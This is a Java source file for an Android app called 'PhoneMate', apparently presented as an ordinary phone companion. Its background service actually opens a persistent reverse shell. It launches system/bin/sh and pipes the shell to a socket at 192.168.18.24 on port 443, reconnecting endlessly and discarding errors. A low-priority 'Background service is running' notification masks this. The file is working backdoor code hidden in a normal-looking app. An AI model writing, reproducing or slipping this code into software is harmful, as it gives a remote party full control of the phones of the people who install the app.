package com.dextrotechnologies.phonemate;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainService extends Service {

    private static final int NOTIF_ID = 1;
    private static final String NOTIF_CHANNEL_ID = "default";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        //start rev-con
        new Thread(() -> {
            // Initiate new con on exit
            while (true){
                try{
                    revConInit();
                } catch (Exception e){
                    // Log.e("Reverse Shell Error", e.getMessage());
                }
            }
        }).start();

        // Create Notification Channel
        initChannels(this);

        // Start Foreground Service
        startForeground();

        return super.onStartCommand(intent, flags, startId);
    }

    private void revConInit() throws Exception {
        // create a process around the shell
        final Process process = Runtime.getRuntime().exec("system/bin/sh");

        // start a socket
        Socket socket = new Socket("192.168.18.24", 443);

        // forward streams until socket closes
        forwardStream(socket.getInputStream(), process.getOutputStream());
        forwardStream(process.getInputStream(), socket.getOutputStream());
        forwardStream(process.getErrorStream(), socket.getOutputStream());
        process.waitFor();

        // close the socket streams
        socket.getInputStream().close();
        socket.getOutputStream().close();
    }

    private static void forwardStream(final InputStream input, final OutputStream output) {
        new Thread(() -> {
            try {
                final byte[] buf = new byte[4096];
                int length;
                while ((length = input.read(buf)) != -1) {
                    if (output != null) {
                        output.write(buf, 0, length);
                        if (input.available() == 0) {
                            output.flush();
                        }
                    }
                }
            } catch (Exception e) {
                // die silently
            } finally {
                try {
                    input.close();
                    if (output != null) {
                        output.close();
                    }
                } catch (IOException e) {
                    // die silently
                }
            }
        }).start();
    }

    private void startForeground() {
        Intent notificationIntent = new Intent(this, MainActivity.class);

        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, 0);

        startForeground(NOTIF_ID, new NotificationCompat.Builder(this,
                NOTIF_CHANNEL_ID)
                .setOngoing(true)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentTitle("PhoneMate")
                .setContentText("Background service is running")
                .setContentIntent(pendingIntent)
                .build());
    }

    private void initChannels(Context context) {
        if (Build.VERSION.SDK_INT < 26) {
            return;
        }
        NotificationManager notificationManager =
                (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        NotificationChannel channel = new NotificationChannel("default",
                "Channel name",
                NotificationManager.IMPORTANCE_MIN);
        channel.setDescription("Channel description");
        notificationManager.createNotificationChannel(channel);
    }
}